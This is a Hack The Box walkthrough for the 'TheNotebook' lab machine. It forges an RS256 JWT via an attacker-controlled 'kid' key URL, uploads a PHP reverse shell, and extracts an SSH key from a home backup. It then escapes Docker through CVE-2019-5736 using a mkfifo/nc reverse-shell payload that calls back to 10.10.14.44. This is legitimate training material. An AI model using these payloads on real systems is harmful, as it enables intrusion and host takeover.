<p align="center"><img src="src/banner.png" alt="Banner"></img></p>
<p align="center">Creator: <a href="https://app.hackthebox.eu/users/120514">mostwanted002</a></p>

# Personal thoughts
Working with asymmetric RS256 algorithm to get admin privs on web, after gaining access we find out that we have sudo privileges on a docker container and abusing this by overwriting `runc` binary. Hope you'll find it useful; if so, consider [suporting](https://www.buymeacoffee.com/f4T1H) a student to get `OSCP` exam and __+respecting my profile in HTB__.

<a href="https://app.hackthebox.eu/profile/184235">
  <img src="https://www.hackthebox.eu/badge/image/184235" alt="f4T1H">
  </img>
</a>
<br>
<a href=https://www.buymeacoffee.com/f4T1H21>
  <img src="https://github.com/f4T1H21/f4T1H21/blob/main/support.png" width="221" height="40" alt="Support">
  </img>
</a>
<br><br>
Now, let me get right into it.

---

# Reconnaissace

```bash
nmap -sS -sC -sV -p- -T4 10.10.10.230
```

```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/http
Basic website, register and see what's inside.
![](src/jwt.png)

Found a jwt token cookie named `auth`, after that I tried some payloads as you can see below.

![](src/payloads.png)

Left to right payloads I used to see if there are any:
1. SSTI
2. SQLi
3. Comments in `lua`, `python` & `php`, `html`
4. XSS

But no way!

```bash
┌──(root💀f4T1H)-[~/hackthebox/thenotebook]
└─> jq -R 'split(".") | .[0],.[1],.[2] | @base64d | fromjson' <<< eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6ImY0VDFIIiwiZW1haWwiOiJmNFQxSEBmNFQxSC5jb20iLCJhZG1pbl9jYXAiOjB9.k7NYdNUR3g5fACqA8laogpevazE4NX2WARDMNd5IzLAJlYxJpbZBOhKmJ-VpdtKbfhHxhe8PYQ67Ieep2t6WtWmcdvpbHeYeyvLsZK0nxMJ7m2VPKhF2iDdm6tqkxFa3bzaoqIBWVeyFR0T3HiEpMypSQh7w4uRsPk3ZbJ8H_BCbE_tQv9hjjO0scozUwCylyJ5UQaQh_r-wrSBEwDsJCPGjpzSOjQUsw6inLjErqbkZbrOVr_zv-HpjNYVkxxCo8DPBWJp_tb_D26s1R9gaZJoWRd3ZmgQNxdjzf09__lD8UBzwJayZ3vttAMQnPd2mSm3qTVtgbVkaeyTU1ZGD00C2fTmmmawsbR8G-hrwmO-EmAhJ5eeLOq9X_zWNK0EM3AuO8gL_YC7AluPNBL6OFh-MNiq6ej5hXf5FWvNUc5ymxD9uD8Ycyehyg4Z0qCnswWcZQ-BtRrZvHQyt7dvSX8qFdmV4GxafGRR1cvnkULm3GtsWRWkUZmwvfkY_EHpLQd_aQ5ExV61DiTfTdD6f6LwgdBlpldq-B-pAKlJTkRCT7uIjNk-paDs2CDseMryuHXAlyXV28kkKt293S4RTJ-c2RcP6ucBbx-fZI5tizkNE08n7E30jB-VGEhEIDR1t22RuTZFon-GJ76RXCD0yuN1OsPRJuktn_rakOJIOXDg
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}
{
  "username": "f4T1H",
  "email": "f4T1H@f4T1H.com",
  "admin_cap": 0
}
jq: error (at <stdin>:1): string ("k7NYdNUR3g...) is not valid base64 data
```

Wee see the signing algorithm used in JWT(Json Web Token) is `RS256` which is unusual.

What's the difference between `RS256` & `HS256` signing algorithms?

>RS256 (RSA Signature with SHA-256) is an asymmetric algorithm, and it uses a public/private key pair: the identity provider has a private (secret) key used to generate the signature, and the consumer of the JWT gets a public key to validate the signature. Since the public key, as opposed to the private key, doesn't need to be kept secured, most identity providers make it easily available for consumers to obtain and use (usually through a metadata URL).

>HS256 (HMAC with SHA-256), on the other hand, involves a combination of a hashing function and one (secret) key that is shared between the two parties used to generate the hash that will serve as the signature. Since the same key is used both to generate the signature and to validate it, care must be taken to ensure that the key is not compromised.

Here we can confirm RSA because it goes and gets a key from the hardcoded link in JWT.

Another thing is that the `admin_cap` as you can guess.

What I'm thinking of is signing the jwt by our own and see if we can change that `admin_cap` to `1`.

### RS256 Signing

```bash
┌──(root💀f4T1H)-[~/hackthebox/thenotebook]
└─> ssh-keygen -t rsa -b 4096 -m PEM -f rs256.key;echo;ls
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in rs256.key
Your public key has been saved in rs256.key.pub
The key fingerprint is:
SHA256:tgdzwNgyH2SDMMXZP4gRcBRopEguVLEuA5uOdb6v8GQ root@f4T1H
The key's randomart image is:
+---[RSA 4096]----+
| o.+*B**+        |
|+. .+o=*..       |
|+..o  +o=o       |
|oo.   .+.oo      |
|oo...   S ..     |
|o.oo   . =       |
|... E   . .      |
|   = .   .       |
|    +o.          |
+----[SHA256]-----+

rs256.key  rs256.key.pub
```

But the public key of the key we generated is not in the correct format.<br>
So we create the public key again using `openssl`.

```bash
┌──(root💀f4T1H)-[~/hackthebox/thenotebook]
└─> openssl rsa -in rs256.key -pubout -outform PEM -out rs256.key.pub; cat rs256.key.pub
writing RSA key
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAxRHirO2Cdxnyqw3WcqnO
lxkOBMnwmFH6dj5JKVeguwwLIo589/KzTOS/RfzZ+3t/ZDaBezsWKw0vfHpb9EsK
E27Z2lwuvIvur1KfL5xvBvIJLwG2On/nkSIonjo/Ail+fgHPFrNbSW7vBoeh/vc7
mC2p5ptPtW7nA+QR06T+Kkolj//R2GuKRpEDeBh2OWXqyGxCUTSWETL9KFJHvRqt
3hm8zUeTCdMNA1QpaAEs6X98zatZrylPbC7uUs6ReZbI1hJrBGBsQ/q2LsI/eaI9
CVFkEJlg1tbX2/sf5kAa9UZpI8WDsuCsgw5twmqfeokK29Hd/IXe4KkLwt3pxDxL
ap0QTG1JtDG7sgoC15+MQztoqAM6oBzqoNyexLTC8BinyCLA48XoPlfrIAhYiu/K
P8d9RbtGJ64dJHR4UnmSYzPCLezxnsoo9vvShZctgUaVynTx9i0uELW6zL8gFLIH
GGqO/zD13usVL5MJWNyqgVGgT/cv5oYCGUC0PuYxn+pevNZHqG4Zu06FK2YiFB+K
7GQkASqXockBqekTdQT8SlLyrGMvGTLui/kewO4FscY4AY5J11uAeHjTN4AcCWV/
5I8nnDq1Ebb9tXZeMbfFIzQYi6YJrGtvXOFAQOezglh6WwVQMO8HSC3+jd/BwT4v
Gx5seR27PjKg6c4DGRO0ecsCAwEAAQ==
-----END PUBLIC KEY-----
```

That one looks :thumbsup:<br>
Now we go to https://jwt.io and put all the ingredients to their own place.

![](src/signjwt.png)

Now let's go ahead and try our new token with the private rsa key being served in our web server.

![](src/admin.png)

And :boom:

__revshell.php__
```php
<?php $sock=fsockopen("IP",PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>
```

Upload and `GET` it.

# Lateral: Home backup

```bash
www-data@thenotebook:~/html$ find / -newermt "2021-02-12" ! -newermt "2021-02-19" -ls 2>/dev/null  | grep -v ' /etc\| /var/lib\| /sys\| /proc\| /boot\| /lib\| /usr/share\| /usr/lib\| /usr/src\| /usr/include'
usr/share\| /usr/lib\| /usr/src\| /usr/include'| /sys\| /proc\| /boot\| /lib\| /u
    10884     44 -rwxr-xr-x   1 root     root        43136 Feb 15 13:08 /usr/bin/mdig
    10882    148 -rwxr-xr-x   1 root     root       150024 Feb 15 13:08 /usr/bin/dig
    10967     68 -rwxr-xr-x   1 root     root        67608 Feb 15 13:08 /usr/bin/nsupdate
     7797      8 -rwxr-xr-x   1 root     root         6332 Feb 17 12:35 /usr/bin/c_rehash
    10880     44 -rwxr-xr-x   1 root     root        41840 Feb 15 13:08 /usr/bin/delv
    10920    132 -rwxr-xr-x   1 root     root       133640 Feb 15 13:08 /usr/bin/nslookup
     8032    708 -rwxr-xr-x   1 root     root       723944 Feb 17 12:35 /usr/bin/openssl
     1320    128 -rwxr-xr-x   1 root     root       129704 Feb 15 13:08 /usr/bin/host
    16234   7660 -rwxr-xr-x   1 root     root      7841912 Feb 18 13:45 /usr/sbin/runc
     7806      4 drwxr-xr-x   5 root     root         4096 Feb 12 06:52 /usr/local/share
   268386      4 drwxrwsr-x   2 root     staff        4096 Feb 12 06:52 /usr/local/share/fonts
   131073      4 drwxr-xr-x   2 root     root         4096 Feb 12 06:22 /bin
    10932      0 lrwxrwxrwx   1 root     root           34 Feb 12 06:17 /initrd.img.old -> boot/initrd.img-4.15.0-135-generic
    24993      0 lrwxrwxrwx   1 root     root            9 Feb 17 09:03 /home/noah/.bash_history -> /dev/null
    32770      4 drwxr-xr-x  14 root     root         4096 Feb 12 06:52 /var
    16396      4 drwxr-xr-x   2 root     root         4096 Feb 17 14:21 /var/log/nginx
     1507      8 -rw-r--r--   1 root     root         4373 Feb 17 09:02 /var/backups/home.tar.gz
     9487      4 -rw-r--r--   1 root     root         3621 Feb 12 06:52 /var/backups/apt.extended_states.3.gz
     8269      4 drwxr-xr-x  10 root     root         4096 Feb 12 06:25 /var/cache
     8284      4 drwxr-xr-x   2 pollinate root         4096 Feb 12 06:25 /var/cache/pollinate
      845      0 -rw-r--r--   1 pollinate daemon          0 Feb 12 06:25 /var/cache/pollinate/seeded
     8194     12 drwxr-xr-x   2 root      root        12288 Feb 16 10:47 /sbin
    10930      0 lrwxrwxrwx   1 root      root           31 Feb 12 06:17 /vmlinuz.old -> boot/vmlinuz-4.15.0-135-generic
    16385      4 drwxr-xr-x   2 root      root         4096 Feb 12 06:25 /snap
      843      4 -r--r--r--   1 root      root          548 Feb 12 06:25 /snap/README
       11     16 drwx------   2 root      root        16384 Feb 12 06:16 /lost+found
www-data@thenotebook:~/html$ 
```

```bash
www-data@thenotebook:/tmp/home$ tar -zxvf /var/backups/home.tar.gz -C /tmp; ls /tmp/home
tmp/homef /var/backups/home.tar.gz -C /tmp; ls /t
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
noah
```

# PrivEsc: Docker Escape overwriting `runc`

```bash
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

```bash
noah@thenotebook:~$ docker --version; ls /usr/bin/docker -l
Docker version 18.06.0-ce, build 0ffa825
-rwxr-xr-x 1 root root 38108056 Jul 18  2018 /usr/bin/docker
```

```bash
noah@thenotebook:~$ uname -m
x86_64
```

>Vulnerability Details : CVE-2019-5736	
runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe. 

Here's the [article](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/) if you want more detail about this exploit.<br>
PoC [repository](https://github.com/Frichetten/CVE-2019-5736-PoC) written in golang.

## Exploitation

```go
. . .

// This is the line of shell commands that will execute on the host
var payload = "#!/bin/bash \n rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.44 2121 >/tmp/f"

. . .
```

Find and change the payload in the code.

Andthen root the machine:

![](src/root.png)

![](/src/gifs/pwned.gif)

---

# Closing
If you liked the writeup, please consider [suporting](https://www.buymeacoffee.com/f4T1H) a student to get `OSCP` exam and __+respecting__ my profile in HTB.

<a href="https://app.hackthebox.eu/profile/184235">
  <img src="https://www.hackthebox.eu/badge/image/184235" alt="f4T1H">
  </img>
</a>
<br>
<a href=https://www.buymeacoffee.com/f4T1H21>
  <img src="https://github.com/f4T1H21/f4T1H21/blob/main/support.png" width="221" height="40" alt="Support">
  </img>
</a>

# Resources
|`HS256 & RS256`|https://stackoverflow.com/questions/39239051/rs256-vs-hs256-whats-the-difference|
|:-|:-|
|__`JWT Debugger`__|__https://jwt.io/__|
|__`Overwriting RunC`__|__https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/__|
|__`CVE-2019-5736 PoC`__|__https://github.com/Frichetten/CVE-2019-5736-PoC__|

<br>

___-Written by f4T1H-___
